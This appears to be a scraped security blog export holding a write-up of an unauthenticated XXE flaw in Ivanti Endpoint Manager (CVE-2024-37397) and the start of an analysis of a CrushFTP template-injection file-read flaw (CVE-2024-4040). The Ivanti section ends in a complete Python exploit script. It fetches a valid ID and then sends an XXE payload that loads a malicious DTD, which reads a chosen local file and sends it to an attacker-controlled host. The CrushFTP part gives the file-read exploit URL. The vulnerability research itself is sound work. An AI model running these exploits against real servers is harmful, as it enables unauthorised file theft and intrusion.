PError(\u0026#34;L10n.Provisioning.Error.InvalidTemplate\u0026#34;, null, PBL.DEBUGLOC, err); flag2 = false; } if (flag2 \u0026amp;\u0026amp; !OleDbHelper.IsValidIdnRange(phistoryTask.LDTaskId)) { prollingLog.Log(PRollingLog.logLevel.VERBOSE, string.Format(\u0026#34;Unable to write to database. The scheduler LDTask is missing for history task Idn {0}.\u0026#34;, phistoryTask.Id), Array.Empty\u0026lt;object\u0026gt;()); err = new PError(\u0026#34;L10n.Provisioning.Error.InvalidScheduledTask\u0026#34;, null, PBL.DEBUGLOC, err); flag2 = false; flag = true; } if (flag2 \u0026amp;\u0026amp; phistoryTask.State != HistoryTaskStateType.Running \u0026amp;\u0026amp; phistoryTask.State != HistoryTaskStateType.Waiting \u0026amp;\u0026amp; phistoryTask.State != HistoryTaskStateType.Canceled) { prollingLog.Log(PRollingLog.logLevel.VERBOSE, string.Format(\u0026#34;Unable to write to database. Altering history task Idn {0} state is not allowed. {1}.\u0026#34;, phistoryTask.Id, phistoryTask.State), Array.Empty\u0026lt;object\u0026gt;()); err = new PError(\u0026#34;L10n.Provisioning.Error.HistoryTaskNotRunning\u0026#34;, null, PBL.DEBUGLOC, err); flag2 = false; } if (flag2 \u0026amp;\u0026amp; (phistoryEntry.State == HistoryEntryStateType.SUCCESS || phistoryEntry.State == HistoryEntryStateType.FAILED)) { prollingLog.Log(PRollingLog.logLevel.VERBOSE, string.Format(\u0026#34;Unable to write to database. Altering history entry Idn {0} state is not allowed. {1}.\u0026#34;, phistoryEntry.Id, phistoryEntry.State), Array.Empty\u0026lt;object\u0026gt;()); err = new PError(\u0026#34;L10n.Provisioning.Error.UnableToModifyHistoryEntry\u0026#34;, null, PBL.DEBUGLOC, err); flag2 = false; } if (flag2) { foreach (string a in Enum.GetNames(typeof(HistoryEntryStateType))) { if (a == actionState) { historyEntryStateType = (HistoryEntryStateType)Enum.Parse(typeof(HistoryEntryStateType), actionState); break; } } if (historyEntryStateType == HistoryEntryStateType.UNKNOWN) { prollingLog.Log(PRollingLog.logLevel.VERBOSE, string.Format(\u0026#34;Unable to write to database. Action state does not map to a business layer enum value, \u0026#39;{0}\u0026#39;.\u0026#34;, actionState), Array.Empty\u0026lt;object\u0026gt;()); err = new PError(\u0026#34;L10n.Provisioning.Error.UnableToModifyHistoryEntry\u0026#34;, null, PBL.DEBUGLOC, err); flag2 = false; } else if (historyEntryStateType == HistoryEntryStateType.NEED_REBOOT) { historyEntryStateType = HistoryEntryStateType.REBOOTING; } } bool flag3 = false; bool flag4 = false; bool flag5 = false; bool flag6 = false; if (flag2) { if (historyEntryStateType == HistoryEntryStateType.FAILED \u0026amp;\u0026amp; phistoryEntry.MustSucceed) { flag = true; } if (historyEntryIDN == -1 \u0026amp;\u0026amp; nextHistoryEntryIDN == -1) { flag = true; } else if (OleDbHelper.IsValidIdnRange(phistoryEntry.Id)) { flag3 = true; flag4 = true; if (OleDbHelper.IsValidIdnRange(phistoryEntry2.Id)) { flag5 = true; } else if (historyEntryStateType != HistoryEntryStateType.MIGHT_REBOOT \u0026amp;\u0026amp; historyEntryStateType != HistoryEntryStateType.REBOOTING \u0026amp;\u0026amp; historyEntryStateType != HistoryEntryStateType.WAITINGONSWD) { flag = true; } else if (actionXml != null \u0026amp;\u0026amp; actionXml.Length \u0026gt; 0) { flag5 = true; flag6 = true; } } } bool flag7 = true; if (flag3) { phistoryEntry.TimestampUTC = utcNow; phistoryEntry.State = historyEntryStateType; if (phistoryEntry.State != HistoryEntryStateType.MIGHT_REBOOT \u0026amp;\u0026amp; phistoryEntry.State != HistoryEntryStateType.REBOOTING) { phistoryEntry.IntReturnValue = internalRetval; phistoryEntry.ExtReturnValue = externalRetval; Encoding ascii = Encoding.ASCII; phistoryEntry.Blob = ascii.GetBytes(strCapturedText); } flag7 = phistoryEntry.Commit(); if (!flag7) { err = new PError(null, null, PBL.DEBUGLOC, phistoryEntry.Error); } } if (flag4) { int historyEntryIdn = phistoryTask.HistoryEntryId; if (OleDbHelper.IsValidIdnRange(phistoryEntry2.Id)) { historyEntryIdn = phistoryEntry2.Id; } try { OleDbHelper.BeginTransaction(); int rv = HistoryTask.UpdateRow(phistoryTask.Id, historyEntryIdn, utcNow); if (!OleDbHelper.IsGoodUpdateReturnValue(rv)) { err = new PError(\u0026#34;L10n.Provisioning.Error.DatabaseError\u0026#34;, null, PBL.DEBUGLOC, err); flag7 = false; } } finally { OleDbHelper.CommitTransaction(); } } if (flag6 \u0026amp;\u0026amp; actionXml != null \u0026amp;\u0026amp; actionXml.Length \u0026gt; 0) { PHistoryEntry phistoryEntry3 = new PHistoryEntry(); flag7 = phistoryEntry3.ImportXml(actionXml); if (!flag7) { err = new PError(null, null, PBL.DEBUGLOC, phistoryEntry3.Error); } ArrayList arrayList = null; flag7 = PHistoryEntry.Read(phistoryTask.Template.Id, phistoryEntry.HistoryTaskId, out arrayList, ref err); if (flag7) { phistoryEntry3.Name = L10n.GetString(\u0026#34;HistoryEntry.InjectedActionName\u0026#34;); phistoryEntry3.HistoryTaskId = phistoryTask.Id; phistoryEntry3.SectionId = phistoryEntry.SectionId; foreach (object obj in arrayList) { PHistoryEntry phistoryEntry4 = (PHistoryEntry)obj; if (phistoryEntry4.SectionId == phistoryEntry.SectionId) { [..snip..] This is rather a very large function to analyze but luckily, I managed to bring it down to certain simplicity. But before that, let\u0026rsquo;s check it\u0026rsquo;s POST request and the actual data we have to sent to the application as part of our HTTP request. Given that we know the service is running on port 8443 and we have IIS manager insalled on our Windows Server, we can navigate within the IIS Manager and find the ProvisioningWebService path and then attempt to reach it from browser.\nIf you have ever come across any of the writeups related to Ivanti Endpoint Manager, you would know majority of them is done through SOAP API and this is not exception. One good thing about SOAP APIs is that it will list the methods supported by the API and give us sample request and an example response to work with.\nNow, that we have a sample SetActionStatus request to work with, let\u0026rsquo;s see how exactly we can reach our targeted function.\nOvercoming Obstacles: Challenges in Exploiting XXE #Now, let\u0026rsquo;s dive deeper into analyzing the logic of WriteActionStatus to reach the part where the ImportXml function is called. Instead of going line by line through the code, we’ll focus on the main checkpoints that lead us to ImportXml.\nif (flag6 \u0026amp;\u0026amp; actionXml != null \u0026amp;\u0026amp; actionXml.Length \u0026gt; 0) { PHistoryEntry phistoryEntry3 = new PHistoryEntry(); flag7 = phistoryEntry3.ImportXml(actionXml); if (!flag7) First, the historyEntryIDN must be valid. This kicks off a series of database lookups involving history tasks and entries. These values are retrieved based on the initial historyEntryIDN. If all validations pass and flag2 remains true, the next significant check involves actionXml. The logic behind flag6 is simple—it checks if actionXml is empty. If it’s not, this sets up the possibility of calling ImportXml.\nHowever, before reaching that point, other conditions must be satisfied, such as ensuring the history entry’s state isn’t in a \u0026ldquo;stale\u0026rdquo; mode (like rebooting or waiting for software delivery). Provided these conditions hold true and flag6 is set, we finally encounter the block that executes ImportXml. At this point, flag6 confirms that actionXml contains valid data, allowing us to pass the final check and proceed with the import.\nNote: I had to make my own entries within the database to get through the check of historyEntryIDN. I had the ID as 5 into the database, so we will be using that in our exploit but rest assured there is a way to get through it when attacking a real target.\nExploiting XXE: Turning Theory Into Action #Now, it is time we get our hands dirty. Let\u0026rsquo;s paste the sample request:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;soap:Envelope xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34; xmlns:soap=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34;\u0026gt; \u0026lt;soap:Body\u0026gt; \u0026lt;SetActionStatus xmlns=\u0026#34;http://tempuri.org/\u0026#34;\u0026gt; \u0026lt;historyTaskIDN\u0026gt;100\u0026lt;/historyTaskIDN\u0026gt; \u0026lt;historyEntryIDN\u0026gt;5\u0026lt;/historyEntryIDN\u0026gt; \u0026lt;nextHistoryEntryIDN\u0026gt;0\u0026lt;/nextHistoryEntryIDN\u0026gt; \u0026lt;actionState\u0026gt;NEED_REBOOT\u0026lt;/actionState\u0026gt; \u0026lt;internalRetval\u0026gt;1\u0026lt;/internalRetval\u0026gt; \u0026lt;externalRetval\u0026gt;1\u0026lt;/externalRetval\u0026gt; \u0026lt;strCapturedText\u0026gt;string\u0026lt;/strCapturedText\u0026gt; \u0026lt;Variables\u0026gt; \u0026lt;UserVariable\u0026gt; \u0026lt;Name\u0026gt;string\u0026lt;/Name\u0026gt; \u0026lt;Value\u0026gt;string\u0026lt;/Value\u0026gt; \u0026lt;VariableOperation\u0026gt;add\u0026lt;/VariableOperation\u0026gt; \u0026lt;/UserVariable\u0026gt; \u0026lt;UserVariable\u0026gt; \u0026lt;Name\u0026gt;string\u0026lt;/Name\u0026gt; \u0026lt;Value\u0026gt;string\u0026lt;/Value\u0026gt; \u0026lt;VariableOperation\u0026gt;add\u0026lt;/VariableOperation\u0026gt; \u0026lt;/UserVariable\u0026gt; \u0026lt;/Variables\u0026gt; \u0026lt;actionXml\u0026gt;\u0026lt;![CDATA[ \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY example SYSTEM \u0026#34;http:///192.168.1.44:8000\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;data\u0026gt;\u0026amp;example;\u0026lt;/data\u0026gt; ]]\u0026gt; \u0026lt;/actionXml\u0026gt; \u0026lt;/SetActionStatus\u0026gt; \u0026lt;/soap:Body\u0026gt; \u0026lt;/soap:Envelope\u0026gt; Observing the request within the Burp Suite showed a 200 response and we observe a hit on our listener:\nCrafting the Final Exploit #From the previous analysis, we understood that a valid historyEntryID is required to perform the SetActionStatus action. Like most exploits, my aim was to minimize dependencies on pre-existing data. In this case, we can leverage the GetTasksXml method to retrieve valid IDs and use them in the SetActionStatus request alongside our XXE payload, leading to the final exploit.\nThe final exploit combines the GetTasksXml and SetActionStatus requests. Essentially, GetTasksXml retrieves the valid historyEntryID, which is then used in the SetActionStatus request containing the XXE payload. Unfortunately, at the time of writing, the installed version had a license expiration issue, making reinstallation more complex than expected. However, the final exploit can be found here and is also pasted below:\n# --------------------------------------------------------- # Exploit Title: Ivanti Endpoint Manager Unauthorized XXE Exploit # CVE: CVE-2024-37397 # Date: 2024-09-17 # Exploit Author: @D4mianWayne # Vulnerability Discovered by: 06fe5fd2bc53027c4a3b7e395af0b850e7b8a044 (Trend Micro) # Vendor Homepage: https://www.ivanti.com/ # Software Link: https://www.ivanti.com/products/ivanti-endpoint-manager # Version: Affected versions [mention affected versions] # Tested on: Ivanti Endpoint Manager version X.X.X # CVE Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37397 # --------------------------------------------------------- import requests import argparse import urllib3 import xml.etree.ElementTree as ET def print_banner(): print(\u0026#34;=\u0026#34;*50) print(\u0026#34; Exploit Script for CVE-2024-37397\u0026#34;) print(\u0026#34; Unauthorized XXE Exploit in Ivanti Endpoint Manager\u0026#34;) print(\u0026#34;=\u0026#34;*50) print(\u0026#34; Created by @D4mianWayne\u0026#34;) print(\u0026#34; Date: 2024-09-17\u0026#34;) print(\u0026#34;=\u0026#34;*50) # Call the function to display the banner def log(message, status=\u0026#34;info\u0026#34;): if status == \u0026#34;success\u0026#34;: print(f\u0026#34;[+] {message}\u0026#34;) elif status == \u0026#34;log\u0026#34;: print(f\u0026#34;[*] {message}\u0026#34;) else: print(f\u0026#34;[-] {message}\u0026#34;) # Function to create the malicious DTD file since this is a blind XXE so we are performing an # OOB XXE attack and exfiltrate data def create_malicious_dtd(file_path, local_ip): dtd_content = f\u0026#39;\u0026#39;\u0026#39;\u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///{file_path}\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; exfiltrate SYSTEM \u0026#39;http://{local_ip}:4444/?content=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %exfiltrate; \u0026#39;\u0026#39;\u0026#39; with open(\u0026#39;malicious.dtd\u0026#39;, \u0026#39;w\u0026#39;) as dtd_file: dtd_file.write(dtd_content) log(f\u0026#34;Malicious DTD created at malicious.dtd\u0026#34;, \u0026#34;success\u0026#34;) def getTasksXml(target_url): log(\u0026#34;Attempting to retrieve historyEntryIDN via getTasksXml\u0026#34;, \u0026#34;log\u0026#34;) headers = { \u0026#34;Content-Type\u0026#34;: \u0026#34;text/xml; charset=utf-8\u0026#34;, \u0026#34;Soapaction\u0026#34;: \u0026#39;\u0026#34;http://tempuri.org/GetTaskXml\u0026#34;\u0026#39; } soap_request = \u0026#39;\u0026#39;\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;soap:Envelope xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34; xmlns:soap=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34;\u0026gt; \u0026lt;soap:Body\u0026gt; \u0026lt;GetTaskXml xmlns=\u0026#34;http://tempuri.org/\u0026#34;\u0026gt; \u0026lt;sids\u0026gt; \u0026lt;ServerIdentifier\u0026gt; \u0026lt;sit\u0026gt;Test\u0026lt;/sit\u0026gt; \u0026lt;sIdentifier\u0026gt;string\u0026lt;/sIdentifier\u0026gt; \u0026lt;/ServerIdentifier\u0026gt; \u0026lt;ServerIdentifier\u0026gt; \u0026lt;sit\u0026gt;Test\u0026lt;/sit\u0026gt; \u0026lt;sIdentifier\u0026gt;string\u0026lt;/sIdentifier\u0026gt; \u0026lt;/ServerIdentifier\u0026gt; \u0026lt;/sids\u0026gt; \u0026lt;/GetTaskXml\u0026gt; \u0026lt;/soap:Body\u0026gt; \u0026lt;/soap:Envelope\u0026gt;\u0026#39;\u0026#39;\u0026#39; response = requests.post(\u0026#34;{}/LANDesk/ManagementSuite/Core/ProvisioningWebService/WebService.asmx\u0026#34;.format(target_url), data=soap_request, headers=headers, verify=False) root = ET.fromstring(response.text) namespace = {\u0026#39;ns\u0026#39;: \u0026#39;http://tempuri.org/\u0026#39;} result = root.find(\u0026#39;.//ns:GetTaskXmlResult\u0026#39;, namespace) if result is not None: return result.text else: log(\u0026#34;GetTaskXmlResult not found\u0026#34;, \u0026#34;error\u0026#34;) exit(1) # SOAP Request for invoking SetActionStatus, a valid historyEntryIDN is required for certain checks to be # fulfilled but I believe it can be bruteforced to work. Additionally, the actionXml content are being passed to the # ImportXml function which was found to be vulnerable to XXE as XmlUrlXmlResolver wasn\u0026#39;t set to null explicitly. def send_soap_request(target_url, local_ip): historyEntryIDN = getTasksXml(target_url) log(\u0026#34;Retrieved historyEntryIDN {}\u0026#34;.format(historyEntryIDN), \u0026#34;success\u0026#34;) log(\u0026#34;Crafting SOAP Request to invole SetActionStatus\u0026#34;, \u0026#34;log\u0026#34;) soap_payload = \u0026#39;\u0026#39;\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;soap:Envelope xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34; xmlns:soap=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34;\u0026gt; \u0026lt;soap:Body\u0026gt; \u0026lt;SetActionStatus xmlns=\u0026#34;http://tempuri.org/\u0026#34;\u0026gt; \u0026lt;historyTaskIDN\u0026gt;100\u0026lt;/historyTaskIDN\u0026gt; \u0026lt;historyEntryIDN\u0026gt;{}\u0026lt;/historyEntryIDN\u0026gt; \u0026lt;nextHistoryEntryIDN\u0026gt;0\u0026lt;/nextHistoryEntryIDN\u0026gt; \u0026lt;actionState\u0026gt;NEED_REBOOT\u0026lt;/actionState\u0026gt; \u0026lt;internalRetval\u0026gt;1\u0026lt;/internalRetval\u0026gt; \u0026lt;externalRetval\u0026gt;1\u0026lt;/externalRetval\u0026gt; \u0026lt;strCapturedText\u0026gt;string\u0026lt;/strCapturedText\u0026gt; \u0026lt;Variables\u0026gt; \u0026lt;UserVariable\u0026gt; \u0026lt;Name\u0026gt;string\u0026lt;/Name\u0026gt; \u0026lt;Value\u0026gt;string\u0026lt;/Value\u0026gt; \u0026lt;VariableOperation\u0026gt;add\u0026lt;/VariableOperation\u0026gt; \u0026lt;/UserVariable\u0026gt; \u0026lt;UserVariable\u0026gt; \u0026lt;Name\u0026gt;string\u0026lt;/Name\u0026gt; \u0026lt;Value\u0026gt;string\u0026lt;/Value\u0026gt; \u0026lt;VariableOperation\u0026gt;add\u0026lt;/VariableOperation\u0026gt; \u0026lt;/UserVariable\u0026gt; \u0026lt;/Variables\u0026gt; \u0026lt;actionXml\u0026gt;\u0026lt;![CDATA[ \u0026lt;!DOCTYPE a [ \u0026lt;!ENTITY % asd SYSTEM \u0026#34;http://{}/malicious.dtd\u0026#34;\u0026gt; %asd; %c; ]\u0026gt; \u0026lt;a\u0026gt;\u0026lt;/a\u0026gt; ]]\u0026gt;\u0026lt;/actionXml\u0026gt; \u0026lt;/SetActionStatus\u0026gt; \u0026lt;/soap:Body\u0026gt; \u0026lt;/soap:Envelope\u0026gt;\u0026#39;\u0026#39;\u0026#39;.format(historyEntryIDN, local_ip) # Define the headers headers = { \u0026#34;Content-Type\u0026#34;: \u0026#34;text/xml; charset=utf-8\u0026#34;, \u0026#34;Soapaction\u0026#34;: \u0026#39;\u0026#34;http://tempuri.org/SetActionStatus\u0026#34;\u0026#39; } # The target URL log(\u0026#34;Sending Request.....\u0026#34;, \u0026#34;log\u0026#34;) url = \u0026#34;{}/LANDesk/ManagementSuite/Core/ProvisioningWebService/WebService.asmx\u0026#34;.format(target_url) # Send the POST request try: response = requests.post(url, data=soap_payload, headers=headers, verify=False) # Print the response from the server log(\u0026#34;Request Successfully Sent!\u0026#34;, \u0026#34;success\u0026#34;) print(f\u0026#34;Response Status Code: {response.status_code}\u0026#34;) print(\u0026#34;Response Content:\u0026#34;) print(response.text) except Exception as E: log(\u0026#34;Error occured: {}\u0026#34;.format(E), \u0026#34;log\u0026#34;) def main(): parser = argparse.ArgumentParser(description=\u0026#34;XXE Exploit Script\u0026#34;) parser.add_argument(\u0026#34;target_url\u0026#34;, help=\u0026#34;Target URL of the web service\u0026#34;) parser.add_argument(\u0026#34;file_path\u0026#34;, help=\u0026#34;Path of the file to exfiltrate\u0026#34;) parser.add_argument(\u0026#34;local_ip\u0026#34;, help=\u0026#34;Local IP address for DTD hosting\u0026#34;) args = parser.parse_args() # Create the malicious DTD create_malicious_dtd(args.file_path, args.local_ip) # Start the HTTP server in a separate thread # Send the SOAP request send_soap_request(args.target_url, args.local_ip) if __name__ == \u0026#34;__main__\u0026#34;: print_banner() main() ","date":"24 November 2024","permalink":"/posts/ivanti-endpoint-manager-xxe-cve-2024-37397/","section":"Posts","summary":"This blog provides an in-depth analysis of the exploitation process for an unauthenticated XXE vulnerability in Ivanti Endpoint Manager, identified as CVE-2024-37397.\nUncovering the ImportXml Vulnerability # This vulnerability was identified by 06fe5fd2bc53027c4a3b7e395af0b850e7b8a044 and detailed in the ZDI advisory, which provided key information about the affected component.","title":"CVE 2024-37397 - Ivanti Endpoint Manager XXE Vulnerability"},{"content":"","date":null,"permalink":"/tags/cve-2024-37297/","section":"Tags","summary":"","title":"CVE-2024-37297"},{"content":"","date":null,"permalink":"/tags/oob-xxe/","section":"Tags","summary":"","title":"OOB-XXE"},{"content":"This blog post contains a thorough analysis of Server Side Template Injection vulnerability in a commercial Managed File Transfer product named CrushFTP. Exploit script is available here.\nCVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability # I am writing a blog post after a very long time. Finally the “hiatus” has ended and now I am back on track for analyzing real world vulnerabilities and how it has been exploited, more so I will try to uncover what exactly happens under the hood. For starter, I had many vulnerabilities listed and I was confused on what to pick up first but then I saw a news stating that a zero day vulnerability was identified in CrushFTP server. I worked on FTP server sometimes back as part of my work so I thought this would be better to pick for starter.\nBefore we delve into the vulnerability and exploit, at the time of writing this blog, there are numerous other articles, exploits and scanning script available on the Internet. I have used them for reference at times to understand which part of the server was actually vulnerable.\nSource: April 19th, 2024 - CVE-2024-4040 CrushFTP v11 versions below 11.1 have a vulnerability where users can escape their VFS and download system files. This has been patched in v11.1.0. Customers using a DMZ in front of their main CrushFTP instance are partially protected with its protocol translation system it utilizes. A DMZ however does not fully protect you and you must update immediately. (CREDIT:Simon Garrelou, of Airbus CERT)\nGiven that the all versions below 11.1.0 and specific version of 10.x is vulnerable to SSTI vulnerability, it could really help us if we can get an older version of this. In this case, there was shokinn/crushftp:latest docker image was present which can spin up a local CrushFTP server with 30 days of trial, more than enough for us to walk through such vulnerability.\nOnce the docker is up and running, we can login to the CrushFTP and confirm the version is 9.3.1_9\nFrom the publicly available data, I found that the vulnerability that allow reading of local files can be triggered by navigating to following URL:\n/WebInterface/function/?command=zip\u0026amp;c2f=\u0026#34;+cookies[\u0026#39;currentAuth\u0026#39;]+\u0026#34;\u0026amp;path=\u0026lt;INCLUDE\u0026gt;\u0026#34;+path+\u0026#34;\u0026lt;/INCLUDE\u0026gt;\u0026amp;names=*\u0026#34; If we break this URL down, we see that on the /WebInterface/function endpoint it gives command parameter with a value of zip followed by c2f which will contain currentAuth value from the cookie and a path parameter where the payload is given. As we already know that this is an unauthenticated vulnerability, this endpoint seemingly don’t require any kind of authentication. More so, it seems like an API call being made for performing a zip operation on the defined path. To further look into this, I checked the ServerSessionAJAX.class file:\nresponse = \u0026#34;\u0026lt;?xml version=\\\u0026#34;1.0\\\u0026#34; encoding=\\\u0026#34;UTF-8\\\u0026#34;?\u0026gt; \\r\\n\u0026#34;; names = crushftp.handlers.Common.url_decode(request.getProperty(\u0026#34;names\u0026#34;)).replace(\u0026#39;\u0026gt;\u0026#39;, \u0026#39;_\u0026#39;).replace(\u0026#39;\u0026lt;\u0026#39;, \u0026#39;_\u0026#39;).split(\u0026#34;\\r\\n\u0026#34;); citrix_api_subdomain = \u0026#34;\u0026#34;; buttons = new Vector(); final StringBuffer firstItemName = new StringBuffer(); for (x = 0; x \u0026lt; names.length; ++x) { response = names[x]; if (!response.startsWith(this.thisSessionHTTP.thisSession.SG(\u0026#34;root_dir\u0026#34;))) { response = this.thisSessionHTTP.thisSession.SG(\u0026#34;root_dir\u0026#34;) + response.substring(1); } this.thisSessionHTTP.cd(response); if (this.thisSessionHTTP.thisSession.check_access_privs(this.thisSessionHTTP.pwd(), \u0026#34;RETR\u0026#34;) \u0026amp;\u0026amp; this.thisSessionHTTP.thisSession.check_access_privs(this.thisSessionHTTP.pwd(), \u0026#34;STOR\u0026#34;)) { this.thisSessionHTTP.thisSession.uiPUT(\u0026#34;the_command\u0026#34;, \u0026#34;ZIP\u0026#34;); this.thisSessionHTTP.thisSession.uiPUT(\u0026#34;the_command_data\u0026#34;, this.thisSessionHTTP.pwd()); transfer_lock = this.thisSessionHTTP.thisSession.uVFS.get_item(response); if (firstItemName.length() == 0) { firstItemName.append(transfer_lock.getProperty(\u0026#34;name\u0026#34;)); } this.thisSessionHTTP.thisSession.uVFS.getListing(buttons, response, 999, 50000, true); else { citrix_api_subdomain = citrix_api_subdomain + \u0026#34;You need download, upload permissions to zip a file:\u0026#34; + response + \u0026#34;\\r\\n\u0026#34;; } refresh_token = crushftp.handlers.Common.url_decode(request.getProperty(\u0026#34;path\u0026#34;)); if (!refresh_token.startsWith(this.thisSessionHTTP.thisSession.SG(\u0026#34;root_dir\u0026#34;))) { refresh_token = this.thisSessionHTTP.thisSession.SG(\u0026#34;root_dir\u0026#34;) + refresh_token.substring(1); } if (this.thisSessionHTTP.thisSession.check_access_privs(refresh_token, \u0026#34;STOR\u0026#34;)) { citrix_api_subdomain = citrix_api_subdomain + \u0026#34;Started zipping...\\r\\n\u0026#34;; ppp = this.thisSessionHTTP.thisSession.uVFS.get_item(refresh_token); name = (new VRL(ppp.getProperty(\u0026#34;url\u0026#34;))).getPath(); Worker.startWorker(new Runnable() { public void run() { String zipName = firstItemName.toString() + \u0026#34;_\u0026#34; + crushftp.handlers.Common.makeBoundary(3); try { crushftp.handlers.Common.zip(name, buttons, name + zipName + \u0026#34;.zipping\u0026#34;); (new File_U(name + zipName + \u0026#34;.zipping\u0026#34;)).renameTo(new File_U(name + zipName + \u0026#34;.zip\u0026#34;)); } catch (Exception var3) { crushftp.handlers.Common.debug(0, (Exception) var3); (new File_U(name + zipName + \u0026#34;.zipping\u0026#34;)).renameTo(new File_U(name + zipName + \u0026#34;.bad\u0026#34;)); } , \u0026#34;Zipping:\u0026#34; + refresh_token + \u0026#34;:\u0026#34; + request.getProperty(\u0026#34;names\u0026#34;)); } else { citrix_api_subdomain = citrix_api_subdomain + \u0026#34;You need upload permissions to zip a file:\u0026#34; + request.getProperty(\u0026#34;path\u0026#34;) + \u0026#34;\\r\\n\u0026#34;; } response = response + \u0026#34;\u0026lt;commandResult\u0026gt;\u0026lt;response\u0026gt;\u0026#34; + citrix_api_subdomain + \u0026#34;\u0026lt;/response\u0026gt;\u0026lt;/commandResult\u0026gt;\u0026#34;; this.thisSessionHTTP.thisSession.uVFS.reset(); return this.writeResponse(response.replace(\u0026#39;%\u0026#39;, \u0026#39; \u0026#39;)); } As we see here, this part of code ends up checking if we have the proper permission to zip the requested file path and we won’t be having it, in this particular case, so what will happen is the following piece of code will be taken place:\nelse { citrix_api_subdomain = citrix_api_subdomain + \u0026#34;You need upload permissions to zip a file:\u0026#34; + request.getProperty(\u0026#34;path\u0026#34;) + \u0026#34;\\r\\n\u0026#34;; } Something to notice here is that our parameter value of path is being included in the response as well and then it is passed to the this.WriteResponse , if we look closely into the WriteResponse functions, a method overloading approach has been done to this such that this function will be called in accordance to the parameters passed to it.\npublic boolean writeResponse(String response) throws Exception { return this.writeResponse(response, true, 200, true, false, true); } public boolean writeResponse(String response, boolean json) throws Exception { return this.writeResponse(response, true, 200, true, json, true); } public boolean writeResponse(String response, boolean log, int code, boolean convertVars, boolean json, boolean log_header) throws Exception { boolean acceptsGZIP = false; return this.writeResponse(response, log, code, convertVars, json, acceptsGZIP, log_header); } public boolean writeResponse(String response, boolean log, int code, boolean convertVars, boolean json, boolean acceptsGZIP, boolean log_header) throws Exception { if (convertVars) { response = ServerStatus.thisObj.change_vars_to_values(response, this.thisSessionHTTP.thisSession); } In the preceding code, it was noted that only the response argument was passed to the writeResponse method. However, upon closer inspection, it becomes evident that the primary writeResponse method requires an additional boolean argument called convertVars as its third parameter. The first writeResponse call sets this argument to true, indicating that variable conversion (convertVars) is enabled. Consequently, the method ServerStatus.thisObj.change_vars_to_values will be invoked.\nCustom Templating Engine #As noticed before, the change_vars_to_values method is called as a method from the ServerStatus class.\nThe main chunk of code is rather big but not complicated to understand. Looking closely into the change_vars_to_values:\npublic String change_vars_to_values(String in_str, SessionCrush the_session) { if (the_session != null) return change_vars_to_values(in_str, the_session.user, the_session.user_info, the_session); return change_vars_to_values(in_str, new Properties(), new Properties(), the_session); } public String change_vars_to_values(String in_str, Properties user, Properties user_info, SessionCrush the_session) { return change_vars_to_values_static(in_str, user, user_info, the_session); } The change_vars_to_values function calls change_vars_to_values_static , this function works like a template engine where it takes placeholder variable and substitute for it’s real value. It first parses the given placeholder value and then substitute it’s value by performing some specified operation.\nBy specified, I meant that the application has defined methods and classes to substitute specific keywords. For the file read vulnerability, there is one such method as well, we will be gooing For example, the following code will replace the placeholders with specified values by retrieving from configurations:\npublic static String change_vars_to_values_static(String in_str, Properties user, Properties user_info, SessionCrush the_session) { try { String r1 = \u0026#34;%\u0026#34;; String r2 = \u0026#34;%\u0026#34;; for (int r = 0; r \u0026lt; 2; r++) { [..snip..] if (in_str.indexOf(String.valueOf(r1) + \u0026#34;beep\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;beep\u0026#34; + r2, \u0026#34;\u0026#34;); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;hostname\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;hostname\u0026#34; + r2, hostname); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;server_time_date\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;server_time_date\u0026#34; + r2, (new Date()).toString()); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;login_number\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;login_number\u0026#34; + r2, uSG(user_info, \u0026#34;user_number\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;users_connected\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;users_connected\u0026#34; + r2, thisObj.getTotalConnectedUsers()); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_password\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_password\u0026#34; + r2, uSG(user_info, \u0026#34;current_password\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_name\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_name\u0026#34; + r2, uSG(user, \u0026#34;username\u0026#34;)); if (in_str.indexOf(String.valueOf(r1) + \u0026#34;user_anonymous_password\u0026#34; + r2) \u0026gt;= 0) in_str = Common.replace_str(in_str, String.valueOf(r1) + \u0026#34;user_anonymous_password\u0026#34; + r2, 